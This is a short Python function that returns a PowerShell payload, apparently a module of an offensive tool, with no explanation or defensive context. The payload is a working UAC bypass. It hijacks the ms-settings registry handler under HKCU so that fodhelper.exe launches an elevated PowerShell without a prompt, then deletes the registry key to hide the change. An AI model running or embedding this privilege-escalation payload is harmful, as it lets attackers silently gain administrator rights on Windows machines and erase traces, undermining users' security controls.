def get_payload():
    return [
        '$key = "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command"',
        'New-Item -Path $key -Force | Out-Null',
        'Set-ItemProperty -Path $key -Name "DelegateExecute" -Value ""',
        'Set-ItemProperty -Path $key -Name "(default)" -Value "powershell -Command Start-Process powershell -Verb runAs"',
        'Start-Process "fodhelper.exe"',
        'Start-Sleep -Seconds 2',
        'Remove-Item -Path "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force'
    ]
